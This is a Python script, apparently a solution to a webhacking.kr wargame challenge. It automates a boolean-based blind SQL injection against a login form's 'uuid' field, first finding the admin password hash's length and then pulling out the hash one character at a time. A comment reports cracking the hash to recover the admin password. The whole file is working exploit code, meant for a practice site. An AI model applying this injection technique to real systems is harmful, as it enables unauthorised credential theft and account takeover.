import string
import requests

url = "https://webhacking.kr/challenge/bonus-2/index.php"
data={}

def find_pw_hash_length():
    pw_hash_len = 0
    while True:
        pw_hash_len += 1
        data["uuid"] = "admin' and length(pw)={}#".format(pw_hash_len)
        data["pw"] = None
        print(data['uuid'])
        res = requests.post(url=url, data=data)
        if "Wrong password!" in res.text:
            ("[+] PASSWORD LENGTH : " + str(pw_hash_len))
            break
    return pw_hash_len

def find_pw_hash(pw_hash_len):
    pw_hash = ""
    for i in range(1,pw_hash_len+1):
        for j in string.printable:
            data['uuid'] = "admin' and ascii(substr(pw,{},1))={}#".format(i, ord(j))
            data["pw"] = None
            print(data['uuid'])
            res = requests.post(url=url, data=data)
            if "Wrong password!" in res.text:
                pw_hash += j
                print("FOUND PASSWORD HASH: " + pw_hash)
                break
    print("[+] PASSWORD HASH: " + pw_hash)
    # hashes.com 에서 hash 복호화 -> wowapple -> admin password : wow
if __name__ == "__main__":
    pw_hash_len = find_pw_hash_length()
    pw_hash = find_pw_hash(pw_hash_len)